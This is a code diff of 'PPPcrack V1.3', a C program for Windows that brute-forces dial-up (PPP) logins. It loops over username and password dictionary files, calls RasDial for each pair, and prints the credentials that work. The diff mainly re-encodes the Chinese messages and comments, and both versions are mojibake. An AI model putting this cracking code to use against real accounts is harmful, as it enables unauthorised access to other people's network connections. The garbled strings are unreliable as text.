@@ -16,7 +16,7 @@ void ppp_ver()
 {
 printf("#================PPPcrack V1.3================#\n");
 printf("|         Written by JeeWin                   |\n");
-printf("|         Email:jeewinchang@126.com           |\n");
+printf("|         Email:jeewinchang@21cn.com          |\n");
 printf("|         Date:2007.1.26                      |\n");
 printf("#=============================================#\n");
 }
@@ -24,8 +24,8 @@ printf("#=============================================#\n");
 void Usage(char *progname) 
 {
 	ppp_ver();
-	printf("Usage:\n%s \t-e <è¿æ¥å> -u <ç”¨æˆ·åå­—å…¸æ–‡ä»¶å> -p <å¯†ç å­—å…¸æ–‡ä»¶å>\n", progname);
-	printf("\t -t [æ—¶å»¶:é»˜è®¤å€¼ä¸º16] /m [æšä¸¾å¯ç”¨è¿æ¥]\n");
+	printf("Usage:\n%s \t-e <Á¬½ÓÃû> -u <ÓÃ»§Ãû×ÖµäÎÄ¼şÃû> -p <ÃÜÂë×ÖµäÎÄ¼şÃû>\n", progname);
+	printf("\t -t [Ê±ÑÓ:Ä¬ÈÏÖµÎª16] /m [Ã¶¾Ù¿ÉÓÃÁ¬½Ó]\n");
 	exit(0);
 }
 
@@ -34,9 +34,9 @@ void main(int argc, char *argv[])
 	int i, p_j = 0;
 	char * userDic;
 	char * passDic;
-	int  p_time	=	16;	// æ—¶å»¶
+	int  p_time	=	16;	// Ê±ÑÓ
 
-	// åˆå§‹åŒ–RasDialParams
+	// ³õÊ¼»¯RasDialParams
 	RasDialParams.dwSize = sizeof(RASDIALPARAMS);
 	strcpy(RasDialParams.szEntryName, "");
 	strcpy(RasDialParams.szPhoneNumber, "");
@@ -53,7 +53,7 @@ void main(int argc, char *argv[])
 				{
 					case 'e': 
 						strcpy(RasDialParams.szEntryName, argv[++i]);
-						p_j += 1;//åˆ¤æ–­å‚æ•°æ˜¯å¦é½å…¨
+						p_j += 1;//ÅĞ¶Ï²ÎÊıÊÇ·ñÆëÈ«
 						break;
 					case 'u': 
 						userDic = argv[++i];
@@ -64,7 +64,7 @@ void main(int argc, char *argv[])
 						p_j += 1;
 						break;
 					case 'm': 
-						ppp_Enum();//æšä¸¾å¯ç”¨è¿æ¥
+						ppp_Enum();//Ã¶¾Ù¿ÉÓÃÁ¬½Ó
 						break;
 					case 't': 
 						p_time = atoi(argv[++i]);
@@ -85,7 +85,7 @@ void main(int argc, char *argv[])
 	else
 	{
 		ppp_ver();
-		printf("-å‚æ•°ä¸å…¨!\n");
+		printf("-²ÎÊı²»È«!\n");
 	}
 	return;
 }
@@ -93,11 +93,11 @@ void main(int argc, char *argv[])
 DWORD ppp_Dial()
 {
 	hRasConn = NULL;
-	DWORD Ret = RasDial(NULL, NULL, &RasDialParams, 0, NULL, &hRasConn); // æ‹¨å·
+	DWORD Ret = RasDial(NULL, NULL, &RasDialParams, 0, NULL, &hRasConn); // ²¦ºÅ
 	return Ret;
 }
 
-// æšä¸¾è¿æ¥
+// Ã¶¾ÙÁ¬½Ó
 void ppp_Enum()
 {
 	DWORD dwSize, dwEntries;
@@ -114,10 +114,10 @@ void ppp_Enum()
 	if(dwEntries>0)
 	{
 		for(DWORD j=0; j<dwEntries; lpRasEntryName++, j++)
-			printf("-è¿æ¥%d:%s\n",j+1,lpRasEntryName->szEntryName);
+			printf("-Á¬½Ó%d:%s\n",j+1,lpRasEntryName->szEntryName);
 	}
 	else
-		printf("-æ²¡æœ‰å¯ç”¨çš„æ‹¨å·è¿æ¥!/n");
+		printf("-Ã»ÓĞ¿ÉÓÃµÄ²¦ºÅÁ¬½Ó!/n");
 	exit(0);
 }
 void ppp_Crack(char *userDic,char *passDic, int p_time)
@@ -132,18 +132,18 @@ void ppp_Crack(char *userDic,char *passDic, int p_time)
 
 	if(!fUserDic && fPassDic)
 	{
-		printf("-ä¸èƒ½æ‰“å¼€ç”¨æˆ·åå­—å…¸æ–‡ä»¶%s!\n", userDic);
+		printf("-²»ÄÜ´ò¿ªÓÃ»§Ãû×ÖµäÎÄ¼ş%s!\n", userDic);
 		fclose(fPassDic);
 	}
 	else if(fUserDic && !fPassDic)
 	{
-		printf("-ä¸èƒ½æ‰“å¼€å¯†ç å­—å…¸æ–‡ä»¶%s!\n", passDic);
+		printf("-²»ÄÜ´ò¿ªÃÜÂë×ÖµäÎÄ¼ş%s!\n", passDic);
 		fclose(fUserDic);
 	}
 	else if(!fUserDic && !fPassDic)
 	{
-		printf("-ä¸èƒ½æ‰“å¼€ç”¨æˆ·åå­—å…¸æ–‡ä»¶%s!\n", userDic);
-		printf("-ä¸èƒ½æ‰“å¼€å¯†ç å­—å…¸æ–‡ä»¶%s!\n", passDic);
+		printf("-²»ÄÜ´ò¿ªÓÃ»§Ãû×ÖµäÎÄ¼ş%s!\n", userDic);
+		printf("-²»ÄÜ´ò¿ªÃÜÂë×ÖµäÎÄ¼ş%s!\n", passDic);
 	}
 	else
 	{
@@ -170,9 +170,9 @@ void ppp_Crack(char *userDic,char *passDic, int p_time)
 			fclose(fBreak);
 		}
 
-		printf("-æ—¶å»¶ä¸º:%d\n", p_time);
-		printf("-ç”¨æˆ·åå­—å…¸æ–‡ä»¶æ˜¯:%s\n", userDic);
-		printf("-å¯†ç å­—å…¸æ–‡ä»¶æ˜¯:%s\n", passDic);
+		printf("-Ê±ÑÓÎª:%d\n", p_time);
+		printf("-ÓÃ»§Ãû×ÖµäÎÄ¼şÊÇ:%s\n", userDic);
+		printf("-ÃÜÂë×ÖµäÎÄ¼şÊÇ:%s\n", passDic);
 		
 		while (fgets(userName,20,fUserDic))
 		{
@@ -190,29 +190,29 @@ void ppp_Crack(char *userDic,char *passDic, int p_time)
 					//DWORD ret = -1;
 					if ( 0 == ret )
 					{
-						printf("\n-GOOD!ç ´è§£æˆåŠŸ,ç”¨æˆ·åä¸º:%s,å¯†ç ä¸º:%s\n",
+						printf("\n-GOOD!ÆÆ½â³É¹¦,ÓÃ»§ÃûÎª:%s,ÃÜÂëÎª:%s\n",
 							RasDialParams.szUserName, RasDialParams.szPassword);
 						Sleep(p_time);
-						RasHangUp(hRasConn); // æ–­å¼€
+						RasHangUp(hRasConn); // ¶Ï¿ª
 						Sleep(p_time);
 						goto loop;
 					}
 					else if ( 691 == ret)
 					{ 
-						printf("-ç”¨æˆ·å:%s,å¯†ç :%s-ç”¨æˆ·åç¬¬%dè¡Œ,å¯†ç ç¬¬%dè¡Œ                 \r",
+						printf("-ÓÃ»§Ãû:%s,ÃÜÂë:%s-ÓÃ»§ÃûµÚ%dĞĞ,ÃÜÂëµÚ%dĞĞ                 \r",
 							RasDialParams.szUserName, RasDialParams.szPassword, userLine, passLine);
 						break;
 					}
 					else
 					{
-						printf("-ç”¨æˆ·å:%s,å¯†ç :%s-å¼‚å¸¸ç¬¬%dæ¬¡,è¿”å›å€¼:%d                    \r",
+						printf("-ÓÃ»§Ãû:%s,ÃÜÂë:%s-Òì³£µÚ%d´Î,·µ»ØÖµ:%d                    \r",
 							RasDialParams.szUserName, RasDialParams.szPassword, i, ret);
 						if ( 10 == i)
 						{
-							printf("-ç”¨æˆ·å:%s,å¯†ç :%s-ç”¨æˆ·åç¬¬%dè¡Œ,å¯†ç ç¬¬%dè¡Œ                 \r",
+							printf("-ÓÃ»§Ãû:%s,ÃÜÂë:%s-ÓÃ»§ÃûµÚ%dĞĞ,ÃÜÂëµÚ%dĞĞ                 \r",
 								RasDialParams.szUserName, RasDialParams.szPassword, userLine, passLine);
 							RasHangUp(hRasConn);
-							printf("-è¿æ¥å¼‚å¸¸!");
+							printf("-Á¬½ÓÒì³£!");
 							return;
 						}
 					}
